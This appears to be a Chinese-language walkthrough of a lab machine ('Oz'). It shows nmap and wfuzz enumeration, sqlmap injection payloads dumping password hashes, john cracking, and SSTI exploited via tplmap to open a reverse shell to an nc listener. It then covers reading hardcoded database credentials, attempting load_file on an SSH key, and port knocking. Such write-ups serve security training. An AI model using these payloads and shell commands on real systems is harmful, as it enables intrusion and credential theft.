
## 端口扫描
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sudo nmap -sT -sCV -O -p80,8080 192.168.10.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 02:58 EDT
Nmap scan report for 192.168.10.18
Host is up (0.00079s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://192.168.10.18:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
MAC Address: 00:0C:29:19:0B:06 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.16 - 4.6 (97%), Linux 3.2 - 4.9 (97%), Linux 4.4 (97%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (91%), Linux 4.10 (91%), Linux 5.1 (91%), Android 5.0 - 6.0.1 (Linux 3.4) (91%), Linux 2.6.32 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds
```

## web渗透

### 目录扫描

![](images/2024-04-26-16-00-43.png)
![](images/2024-04-26-16-01-47.png)
当访问其它目录时，status仍然是200，但是回显的数据各有不同
用wfuzz过滤探测一下
![](images/2024-04-26-16-03-21.png)
分析发现无用数据都是1 W或者27 Ch

```bash
┌──(kali㉿kali)-[~/workspace]
└─$ wfuzz -u http://192.168.10.18/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 27 --hw 1
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.10.18/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        3 L      6 W        75 Ch       "# directory-list-2.3-medium.txt"
000000007:   200        3 L      6 W        75 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
000000003:   200        3 L      6 W        75 Ch       "# Copyright 2007 James Fisher"
000000014:   200        3 L      6 W        75 Ch       "http://192.168.10.18/"
000000013:   200        3 L      6 W        75 Ch       "#"
000000012:   200        3 L      6 W        75 Ch       "# on atleast 2 different hosts"
000000011:   200        3 L      6 W        75 Ch       "# Priority ordered case sensative list, where entries were found"
000000004:   200        3 L      6 W        75 Ch       "#"
000000008:   200        3 L      6 W        75 Ch       "# or send a letter to Creative Commons, 171 Second Street,"
000000009:   200        3 L      6 W        75 Ch       "# Suite 300, San Francisco, California, 94105, USA."
000000005:   200        3 L      6 W        75 Ch       "# This work is licensed under the Creative Commons"
000000010:   200        3 L      6 W        75 Ch       "#"
000000002:   200        3 L      6 W        75 Ch       "#"
000000006:   200        3 L      6 W        75 Ch       "# Attribution-Share Alike 3.0 License. To view a copy of this"
000000202:   200        3 L      6 W        75 Ch       "users"
```

得到users目录
![](images/2024-04-26-16-21-30.png)
这里用户名是通过`/`拼接传入的
传入admin
构造一下sqli语句
![](images/2024-04-26-16-23-09.png)
发现sql注入

### sqlmap跑数据
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ sqlmap -u http://192.168.10.18/users/admin -D ozdb -T users_gbw --dump --batch
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.10.18/users/admin' AND 6507=6507 AND 'JLcK'='JLcK

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.10.18/users/admin' AND (SELECT 3099 FROM (SELECT(SLEEP(5)))WEYs) AND 'eyql'='eyql

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.10.18/users/admin' UNION ALL SELECT CONCAT(0x716a716a71,0x55634f79767053485059787854456f456a634f707373674e65794d6952576863636c42764c75666d,0x7178717171)-- -
---
[05:10:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[05:10:38] [INFO] fetching columns for table 'users_gbw' in database 'ozdb'
[05:10:38] [INFO] fetching entries for table 'users_gbw' in database 'ozdb'
Database: ozdb
Table: users_gbw
[6 entries]
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+
```
得到一些hash密码和用户名
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ cat hash | awk -F'|' '{print $3}' |grep 'sha'
 $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
 $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk
 $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY
 $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY
 $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg
 $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ

┌──(kali㉿kali)-[~/workspace]
└─$ cat hash | awk -F'|' '{print $3}' |grep 'sha'>hash

┌──(kali㉿kali)-[~/workspace]
└─$ john hash
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst

```
整理一下john爆破
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pass
Using default input encoding: UTF-8
Loaded 1 password hash (PBKDF2-HMAC-SHA256 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:46 0.84% (ETA: 07:00:58) 0g/s 3130p/s 3130c/s 3130C/s 12201985..1101992
0g 0:00:01:21 1.48% (ETA: 07:01:19) 0g/s 3082p/s 3082c/s 3082C/s anjhel..andref
wizardofoz22     (?)
```

### 8080后台登录，ssti


![](images/2024-04-26-17-49-57.png)
Dorthi在家目录能找到公钥。。

![](images/2024-04-26-18-00-15.png)
![](images/2024-04-26-18-01-20.png)
这个地方存在ssti注入
用tqlmap
`python tplmap.py -u 'http://192.168.10.18:8080' -X POST -d 'name=*&desc=anything'  -c 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IndpemFyZC5veiIsImV4cCI6MTcxNDE2MTkyNX0.F4eJX7Kl1YK7Itt_Q4Eu2NOQh62s1eeKRVhZLSPYfWI' --reverse-shell 192.168.10.12 2333`
![](images/2024-04-26-19-45-52.png)
接收到shell
```bash
┌──(kali㉿kali)-[~/workspace]
└─$ nc -lvnp 2333
listening on [any] 2333 ...
connect to [192.168.10.12] from (UNKNOWN) [192.168.10.18] 43378
/bin/sh: can't access tty; job control turned off
/app # whoami
root
/app # pwd
/app
/app # ls
Dockerfile
run.py
start.sh
ticketer
```
这个shell虽然是root
但是不是真正目标
```bash
/app/ticketer # cat database.py
#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask_sqlalchemy import SQLAlchemy
from . import app
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb'
db = SQLAlchemy(app)

class Users(db.Model):
    __tablename__ = 'users_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    username = db.Column('username', db.Text, nullable=False)
    password = db.Column('password', db.Text, nullable=False)

class Tickets(db.Model):
    __tablename__ = 'tickets_gbw'
    id = db.Column('id', db.Integer, primary_key=True)
    ticket_name = db.Column('name', db.String(10), nullable=False)
    ticket_desc = db.Column('desc', db.Text, nullable=False)

db.create_all()
db.session.commit()
```

得到一组密码
dorthi:N0Pl4c3L1keH0me

在另一个文件夹发现root密码

MYSQL_ROOT_PASSWORD=SuP3rS3cr3tP@ss

```bash
/app # mysql -h 10.100.10.4 -u dorthi -pN0Pl4c3L1keH0me
mysql -h 10.100.10.4 -u dorthi -pN0Pl4c3L1keH0me
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 9
Server version: 5.5.59-MariaDB-1~wheezy mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

/app # mysql -h 10.100.10.4 -udorthi -p
mysql -h 10.100.10.4 -udorthi -p
Enter password: N0Pl4c3L1keH0me

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 12
Server version: 5.5.59-MariaDB-1~wheezy mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> select load_file('/home/dorthi/.ssh/id_rsa');
select load_file('/home/dorthi/.ssh/id_rsa');
+---------------------------------------+
| load_file('/home/dorthi/.ssh/id_rsa') |
+---------------------------------------+
| NULL                                  |
+---------------------------------------+
```
这里是没找到密钥啊，和题解一样的路径做法也不行吗
那就把题解的密钥拿过来试下


```bash
/ # find / -name 'knock*' -type f 2>/dev/null
/.secret/knockd.conf
/sys/module/kgdb_nmi/parameters/knock
/ # cd /.secret/knockd.conf
/bin/sh: cd: can't cd to /.secret/knockd.conf
/ # cat /.secret/knockd.conf
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn
```
找到这个靶机的knockd文件
发现敲门端口
```bash
┌──(kali㉿kali)-[/tmp]
└─$ knock -v 192.168.10.18 40809 50212 46969
hitting tcp 192.168.10.18:40809
hitting tcp 192.168.10.18:50212
hitting tcp 192.168.10.18:46969

┌──(kali㉿kali)-[/tmp]
└─$ nmap -sT -sCV -p22  192.168.10.18
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-26 07:56 EDT
Nmap scan report for 192.168.10.18
Host is up (0.0010s latency).

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```
成功敲开了ssh
